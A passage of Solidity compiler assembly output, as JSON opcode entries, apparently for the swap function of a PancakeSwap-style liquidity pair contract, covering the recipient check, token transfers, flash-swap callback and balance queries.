											"begin": 12610,
											"end": 12637,
											"name": "SWAP3"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "SWAP1"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "SWAP2"
										},
										{
											"begin": 12610,
											"end": 12637,
											"name": "DIV"
										},
										{
											"begin": 12597,
											"end": 12637,
											"name": "DUP13"
										},
										{
											"begin": 12597,
											"end": 12637,
											"name": "SUB"
										},
										{
											"begin": 12597,
											"end": 12637,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "SWAP1"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "DUP2"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "AND"
										},
										{
											"begin": 12737,
											"end": 12743,
											"name": "SWAP2"
										},
										{
											"begin": 12775,
											"end": 12781,
											"name": "DUP2"
										},
										{
											"begin": 12775,
											"end": 12781,
											"name": "AND"
										},
										{
											"begin": 12775,
											"end": 12781,
											"name": "SWAP1"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "DUP12"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "AND"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "DUP3"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "EQ"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "DUP1"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "ISZERO"
										},
										{
											"begin": 12803,
											"end": 12816,
											"name": "SWAP1"
										},
										{
											"begin": 12803,
											"end": 12833,
											"name": "PUSH [tag]",
											"value": "145"
										},
										{
											"begin": 12803,
											"end": 12833,
											"name": "JUMPI"
										},
										{
											"begin": 12803,
											"end": 12833,
											"name": "POP"
										},
										{
											"begin": 12826,
											"end": 12833,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12820,
											"end": 12833,
											"name": "AND"
										},
										{
											"begin": 12820,
											"end": 12822,
											"name": "DUP12"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12820,
											"end": 12833,
											"name": "AND"
										},
										{
											"begin": 12820,
											"end": 12833,
											"name": "EQ"
										},
										{
											"begin": 12820,
											"end": 12833,
											"name": "ISZERO"
										},
										{
											"begin": 12803,
											"end": 12833,
											"name": "tag",
											"value": "145"
										},
										{
											"begin": 12803,
											"end": 12833,
											"name": "JUMPDEST"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH [tag]",
											"value": "146"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "JUMPI"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP1"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP2"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MSTORE"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP3"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "ADD"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MSTORE"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "13"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP3"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "ADD"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F544F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "68"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP3"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "ADD"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MSTORE"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "SWAP1"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "MLOAD"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "SWAP1"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "DUP2"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "SWAP1"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "SUB"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "ADD"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "SWAP1"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "REVERT"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "tag",
											"value": "146"
										},
										{
											"begin": 12795,
											"end": 12857,
											"name": "JUMPDEST"
										},
										{
											"begin": 12875,
											"end": 12889,
											"name": "DUP13"
										},
										{
											"begin": 12875,
											"end": 12889,
											"name": "ISZERO"
										},
										{
											"begin": 12871,
											"end": 12932,
											"name": "PUSH [tag]",
											"value": "148"
										},
										{
											"begin": 12871,
											"end": 12932,
											"name": "JUMPI"
										},
										{
											"begin": 12891,
											"end": 12932,
											"name": "PUSH [tag]",
											"value": "148"
										},
										{
											"begin": 12905,
											"end": 12912,
											"name": "DUP3"
										},
										{
											"begin": 12914,
											"end": 12916,
											"name": "DUP13"
										},
										{
											"begin": 12918,
											"end": 12931,
											"name": "DUP7"
										},
										{
											"begin": 12891,
											"end": 12904,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 12891,
											"end": 12932,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12891,
											"end": 12932,
											"name": "tag",
											"value": "148"
										},
										{
											"begin": 12891,
											"end": 12932,
											"name": "JUMPDEST"
										},
										{
											"begin": 12984,
											"end": 12998,
											"name": "DUP12"
										},
										{
											"begin": 12984,
											"end": 12998,
											"name": "ISZERO"
										},
										{
											"begin": 12980,
											"end": 13041,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 12980,
											"end": 13041,
											"name": "JUMPI"
										},
										{
											"begin": 13000,
											"end": 13041,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 13014,
											"end": 13021,
											"name": "DUP2"
										},
										{
											"begin": 13023,
											"end": 13025,
											"name": "DUP13"
										},
										{
											"begin": 13027,
											"end": 13040,
											"name": "DUP6"
										},
										{
											"begin": 13000,
											"end": 13013,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 13000,
											"end": 13041,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13000,
											"end": 13041,
											"name": "tag",
											"value": "151"
										},
										{
											"begin": 13000,
											"end": 13041,
											"name": "JUMPDEST"
										},
										{
											"begin": 13093,
											"end": 13108,
											"name": "DUP9"
										},
										{
											"begin": 13093,
											"end": 13108,
											"name": "ISZERO"
										},
										{
											"begin": 13089,
											"end": 13326,
											"name": "PUSH [tag]",
											"value": "152"
										},
										{
											"begin": 13089,
											"end": 13326,
											"name": "JUMPI"
										},
										{
											"begin": 13134,
											"end": 13136,
											"name": "DUP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13126,
											"end": 13149,
											"name": "AND"
										},
										{
											"begin": 13126,
											"end": 13149,
											"name": "PUSH",
											"value": "84800812"
										},
										{
											"begin": 13171,
											"end": 13181,
											"name": "CALLER"
										},
										{
											"begin": 13203,
											"end": 13216,
											"name": "DUP7"
										},
										{
											"begin": 13253,
											"end": 13266,
											"name": "DUP7"
										},
										{
											"begin": 13304,
											"end": 13308,
											"name": "DUP15"
										},
										{
											"begin": 13304,
											"end": 13308,
											"name": "DUP15"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MLOAD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP7"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "AND"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "SHL"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP1"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "AND"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP6"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP5"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP1"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP3"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "SUB"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP3"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP5"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP5"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP3"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MSTORE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ADD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "SWAP3"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 30,
											"end": 33,
											"name": "DUP1"
										},
										{
											"begin": 22,
											"end": 28,
											"name": "DUP3"
										},
										{
											"begin": 14,
											"end": 20,
											"name": "DUP5"
										},
										{
											"begin": 1,
											"end": 34,
											"name": "CALLDATACOPY"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP2"
										},
										{
											"begin": 85,
											"end": 91,
											"name": "DUP5"
										},
										{
											"begin": 81,
											"end": 97,
											"name": "ADD"
										},
										{
											"begin": 74,
											"end": 101,
											"name": "MSTORE"
										},
										{
											"begin": 137,
											"end": 141,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 133,
											"end": 142,
											"name": "NOT"
										},
										{
											"begin": 126,
											"end": 130,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 121,
											"end": 124,
											"name": "DUP3"
										},
										{
											"begin": 117,
											"end": 131,
											"name": "ADD"
										},
										{
											"begin": 113,
											"end": 143,
											"name": "AND"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "SWAP1"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "POP"
										},
										{
											"begin": 169,
											"end": 172,
											"name": "DUP1"
										},
										{
											"begin": 161,
											"end": 167,
											"name": "DUP4"
										},
										{
											"begin": 157,
											"end": 173,
											"name": "ADD"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "SWAP3"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "SWAP7"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "MLOAD"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP1"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP4"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "SUB"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP2"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP8"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "DUP1"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "153"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "GAS"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "CALL"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13126,
											"end": 13326,
											"name": "POP"
										},
										{
											"begin": 13089,
											"end": 13326,
											"name": "tag",
											"value": "152"
										},
										{
											"begin": 13089,
											"end": 13326,
											"name": "JUMPDEST"
										},
										{
											"begin": 13341,
											"end": 13350,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13377,
											"end": 13380,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 13367,
											"end": 13373,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 13367,
											"end": 13373,
											"name": "SLOAD"
										},
										{
											"begin": 13354,
											"end": 13364,
											"name": "DUP16"
										},
										{
											"begin": 13354,
											"end": 13373,
											"name": "MUL"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "DUP2"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "JUMPI"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "INVALID"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "tag",
											"value": "155"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "JUMPDEST"
										},
										{
											"begin": 13353,
											"end": 13380,
											"name": "DIV"
										},
										{
											"begin": 13341,
											"end": 13380,
											"name": "SWAP1"
										},
										{
											"begin": 13341,
											"end": 13380,
											"name": "POP"
										},
										{
											"begin": 13394,
											"end": 13403,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13430,
											"end": 13433,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 13420,
											"end": 13426,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 13420,
											"end": 13426,
											"name": "SLOAD"
										},
										{
											"begin": 13407,
											"end": 13417,
											"name": "DUP16"
										},
										{
											"begin": 13407,
											"end": 13426,
											"name": "MUL"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "DUP2"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "PUSH [tag]",
											"value": "156"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "JUMPI"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "INVALID"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "tag",
											"value": "156"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "JUMPDEST"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "DIV"
										},
										{
											"begin": 13406,
											"end": 13433,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13452,
											"end": 13466,
											"name": "DUP15"
										},
										{
											"begin": 13452,
											"end": 13466,
											"name": "ISZERO"
										},
										{
											"begin": 13448,
											"end": 13508,
											"name": "PUSH [tag]",
											"value": "158"
										},
										{
											"begin": 13448,
											"end": 13508,
											"name": "JUMPI"
										},
										{
											"begin": 13491,
											"end": 13501,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13491,
											"end": 13501,
											"name": "SLOAD"
										},
										{
											"begin": 13468,
											"end": 13508,
											"name": "PUSH [tag]",
											"value": "158"
										},
										{
											"begin": 13468,
											"end": 13508,
											"name": "SWAP1"
										},
										{
											"begin": 13482,
											"end": 13489,
											"name": "DUP6"
										},
										{
											"begin": 13482,
											"end": 13489,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13491,
											"end": 13501,
											"name": "AND"
										},
										{
											"begin": 13503,
											"end": 13507,
											"name": "DUP5"
										},
										{
											"begin": 13468,
											"end": 13481,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 13468,
											"end": 13508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13468,
											"end": 13508,
											"name": "tag",
											"value": "158"
										},
										{
											"begin": 13468,
											"end": 13508,
											"name": "JUMPDEST"
										},
										{
											"begin": 13560,
											"end": 13574,
											"name": "DUP14"
										},
										{
											"begin": 13560,
											"end": 13574,
											"name": "ISZERO"
										},
										{
											"begin": 13556,
											"end": 13616,
											"name": "PUSH [tag]",
											"value": "160"
										},
										{
											"begin": 13556,
											"end": 13616,
											"name": "JUMPI"
										},
										{
											"begin": 13599,
											"end": 13609,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13599,
											"end": 13609,
											"name": "SLOAD"
										},
										{
											"begin": 13576,
											"end": 13616,
											"name": "PUSH [tag]",
											"value": "160"
										},
										{
											"begin": 13576,
											"end": 13616,
											"name": "SWAP1"
										},
										{
											"begin": 13590,
											"end": 13597,
											"name": "DUP5"
										},
										{
											"begin": 13590,
											"end": 13597,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13599,
											"end": 13609,
											"name": "AND"
										},
										{
											"begin": 13611,
											"end": 13615,
											"name": "DUP4"
										},
										{
											"begin": 13576,
											"end": 13589,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 13576,
											"end": 13616,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13576,
											"end": 13616,
											"name": "tag",
											"value": "160"
										},
										{
											"begin": 13576,
											"end": 13616,
											"name": "JUMPDEST"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP2"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MSTORE"
										},
										{
											"begin": 13709,
											"end": 13713,
											"name": "ADDRESS"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP3"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "ADD"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MSTORE"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "DUP7"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "AND"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "SWAP2"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "SWAP2"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP4"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "ADD"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP3"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP3"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP2"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP3"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SWAP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "SUB"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "ADD"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP2"
										},
										{
											"begin": 13675,
											"end": 13700,
											"name": "DUP7"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "DUP1"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "161"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "161"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "POP"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "GAS"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "STATICCALL"
										},
										{
											"begin": 13675,
											"end": 13715,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "162"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
